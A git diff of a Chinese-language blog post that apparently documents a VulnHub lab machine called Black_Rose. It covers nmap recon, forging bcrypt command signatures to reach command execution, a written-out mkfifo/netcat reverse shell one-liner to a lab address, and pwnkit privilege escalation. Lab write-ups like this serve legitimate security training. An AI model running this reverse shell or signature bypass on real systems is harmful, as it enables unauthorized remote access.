@@ -11,84 +11,10 @@
         document.documentElement.setAttribute("data-color-mode", theme);
     </script>
 <meta name="description" content="# 靶机信息
-
-
-# 信息收集
-## NMAP扫描
-```
-└─$ nmap -sCV -p22,80,3306 -O --min-rate 1000 192.168.218.223 -oA nmapScan/details
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 01:21 EST
-Nmap scan report for 192.168.218.223 (192.168.218.223)
-Host is up (0.0010s latency).
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 d1:9b:10:88:15:e9:7a:c4:1a:29:07:3c:21:87:c4:ac (RSA)
-|   256 e3:50:0b:c9:e8:f1:68:7f:e7:cf:ec:de:7b:b9:20:a1 (ECDSA)
-|_  256 55:0e:96:22:cc:50:20:d9:dd:c2:ff:5b:25:d0:d7:2b (ED25519)
-80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-| http-title: BlackRose
-|_Requested resource was login.php
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-3306/tcp open  mysql   MySQL (unauthorized)
-MAC Address: 00:0C:29:C2:40:13 (VMware)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.14
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 40.81 seconds
-```
-三个端口，普通的端口，正常打点。">
+这是一个需要打靶经验，并且需要不断试错的vulnhub渗透测试靶机，从黑盒思维判断登录验证逻辑，绕过登录校验，再对加解密的理解，以及RCE的不断试错，再到最后的提权，给个困难难度。">
 <meta property="og:title" content="Black_Rose">
 <meta property="og:description" content="# 靶机信息
-
-
-# 信息收集
-## NMAP扫描
-```
-└─$ nmap -sCV -p22,80,3306 -O --min-rate 1000 192.168.218.223 -oA nmapScan/details
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 01:21 EST
-Nmap scan report for 192.168.218.223 (192.168.218.223)
-Host is up (0.0010s latency).
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 d1:9b:10:88:15:e9:7a:c4:1a:29:07:3c:21:87:c4:ac (RSA)
-|   256 e3:50:0b:c9:e8:f1:68:7f:e7:cf:ec:de:7b:b9:20:a1 (ECDSA)
-|_  256 55:0e:96:22:cc:50:20:d9:dd:c2:ff:5b:25:d0:d7:2b (ED25519)
-80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-| http-title: BlackRose
-|_Requested resource was login.php
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-3306/tcp open  mysql   MySQL (unauthorized)
-MAC Address: 00:0C:29:C2:40:13 (VMware)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.14
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 40.81 seconds
-```
-三个端口，普通的端口，正常打点。">
+这是一个需要打靶经验，并且需要不断试错的vulnhub渗透测试靶机，从黑盒思维判断登录验证逻辑，绕过登录校验，再对加解密的理解，以及RCE的不断试错，再到最后的提权，给个困难难度。">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://dehua-rd.github.io/post/Black_Rose.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/154585050?v=4">
@@ -160,6 +86,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>靶机信息</h1>
+<p>这是一个需要打靶经验，并且需要不断试错的vulnhub渗透测试靶机，从黑盒思维判断登录验证逻辑，绕过登录校验，再对加解密的理解，以及RCE的不断试错，再到最后的提权，给个困难难度。</p>
 <h1>信息收集</h1>
 <h2>NMAP扫描</h2>
 <pre class="notranslate"><code class="notranslate">└─$ nmap -sCV -p22,80,3306 -O --min-rate 1000 192.168.218.223 -oA nmapScan/details
@@ -224,9 +151,23 @@ Nmap done: 1 IP address (1 host up) scanned in 40.81 seconds
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3a276bc2-b506-45cf-bfd0-256060105ed7"><img width="1919" height="932" alt="Image" src="https://github.com/user-attachments/assets/3a276bc2-b506-45cf-bfd0-256060105ed7" style="max-width: 100%; height: auto; max-height: 932px;"></a></p>
 <p>错误的签名，是一个 bcrypt 哈希，使用hashcat爆破一下，是whoami的密文</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b2f49a5a-4241-404f-9c58-12725bae70fc"><img width="1916" height="910" alt="Image" src="https://github.com/user-attachments/assets/b2f49a5a-4241-404f-9c58-12725bae70fc" style="max-width: 100%; height: auto; max-height: 910px;"></a></p>
-<p>那么初步判断是将command中的命令加密作为签名。</p>
+<p>那么初步判断是将command中的命令加密作为签名。并且在后续尝试发现对他的salt值也不固定，随机的也行。<br>
+使用一下命令生成没有用户名的签名</p>
+<blockquote>
+<p>htpasswd -bnBC "10" "" "ls" | tr -d ':\n'</p>
+</blockquote>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/dbaefdb9-19c8-4b5b-8f61-9b418c383b11"><img width="1919" height="968" alt="Image" src="https://github.com/user-attachments/assets/dbaefdb9-19c8-4b5b-8f61-9b418c383b11" style="max-width: 100%; height: auto; max-height: 968px;"></a></p>
-<p>确实是这样</p></div>
+<p>确实是这样。</p>
+<h1>漏洞利用</h1>
+<p>开始获取shell<br>
+再尝试bash，sh，nc之后我发现有报错命令报错会弹窗error，不知道为什么不行，最后使用<code class="notranslate">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.218.148 4444 &gt; /tmp/f</code>反弹成功。</p>
+<h1>提权</h1>
+<p>直接上linpeas扫一遍</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ab3da31e-8f95-4794-a864-d487945429ac"><img width="1919" height="774" alt="Image" src="https://github.com/user-attachments/assets/ab3da31e-8f95-4794-a864-d487945429ac" style="max-width: 100%; height: auto; max-height: 774px;"></a></p>
+<p>没有其他明显的提权提示，所以我就直接尝试内核提权，先试第一个，可行性最高<br>
+使用<code class="notranslate">gcc --static pwnkit.c -o exp</code> 静态编译，以免环境</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4509aef5-7d9c-4168-8dd3-b7fbd4f1c69a"><img width="1919" height="669" alt="Image" src="https://github.com/user-attachments/assets/4509aef5-7d9c-4168-8dd3-b7fbd4f1c69a" style="max-width: 100%; height: auto; max-height: 669px;"></a></p>
+<p>提权成功。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
